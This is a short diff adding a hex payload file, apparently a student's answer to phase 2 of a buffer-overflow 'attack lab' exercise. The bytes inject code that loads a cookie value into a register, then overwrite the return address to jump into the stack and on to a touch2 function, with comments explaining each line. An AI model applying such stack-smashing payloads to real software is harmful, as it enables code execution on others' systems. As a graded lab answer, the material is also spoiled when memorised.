@@ -1,0 +1,5 @@
+48 c7 c7 96 71 18 70 c3     /* Dissasembled instructions: mov $0x70187196, %rdi and retq */
+00 00 00 00 00 00 00 00     /* This instructions set my cookie as argument. */
+00 00 00 00 00 00 00 00     /* Padding. */
+a8 05 61 55 00 00 00 00     /* Stack top address after invoking getbuf with 24 bytes arguments */
+52 18 40 00 00 00 00 00     /* touch2 function address.*/
